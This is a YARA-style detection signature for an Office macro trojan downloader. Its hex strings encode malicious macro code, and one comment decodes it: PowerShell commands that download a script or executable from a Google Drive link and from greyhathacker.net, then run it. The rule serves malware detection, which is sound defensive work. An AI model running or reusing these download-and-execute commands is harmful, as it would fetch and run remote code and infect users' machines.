
rule TrojanDownloader_O97M_Obfuse_PM_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 01 00 "
		
	strings :
		$a_00_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 22 22 49 45 58 20 28 28 6e 65 77 2d 6f 62 6a 65 63 74 20 6e 65 74 2e 77 65 62 63 6c 69 65 6e 74 29 2e 64 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 64 72 69 76 65 2e 67 6f 6f 67 6c 65 2e 63 6f 6d 2f 75 63 3f 69 64 3d 31 66 78 6a 32 5f 49 54 6e 71 31 59 62 36 51 62 58 77 33 48 6e 63 52 75 77 46 41 42 38 77 4e 34 37 26 65 78 70 6f 72 74 3d 64 6f 77 6e 6c 6f 61 64 } //01 00  powershell.exe ""IEX ((new-object net.webclient).downloadstring('https://drive.google.com/uc?id=1fxj2_ITnq1Yb6QbXw3HncRuwFAB8wN47&export=download
		$a_02_1 = {3d 20 53 68 65 6c 6c 28 22 50 6f 77 65 72 53 68 65 6c 6c 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 3a 2f 2f 77 77 77 2e 67 72 65 79 68 61 74 68 61 63 6b 65 72 2e 6e 65 74 2f 74 6f 6f 6c 73 2f 90 02 20 2e 65 78 65 27 2c 27 90 02 20 2e 65 78 65 27 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 27 90 02 20 2e 65 78 65 27 22 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}